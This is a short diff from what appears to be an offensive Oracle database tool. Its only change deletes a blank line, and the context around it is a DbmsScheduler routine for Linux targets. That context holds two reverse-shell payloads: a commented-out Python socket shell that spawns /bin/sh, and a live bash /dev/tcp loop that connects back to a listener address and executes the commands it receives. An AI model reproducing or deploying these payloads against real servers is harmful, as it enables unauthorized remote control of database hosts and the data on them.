@@ -195,7 +195,6 @@ class DbmsScheduler (OracleDatabase):
 			status = self.__getJobStatus__()
 			self.__removeJob__(self.jobName, force=False, defer=True)
 
-
 		elif self.remoteSystemIsLinux() == True :
 			#PYTHON_CODE = """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);""".format(localip, localport)
 			PYTHON_CODE = """import os; os.system('exec 5<>/dev/tcp/{0}/{1}; /bin/cat <&5 | while read line; do $line 2>&5 >&5; done');""".format(localip, localport)
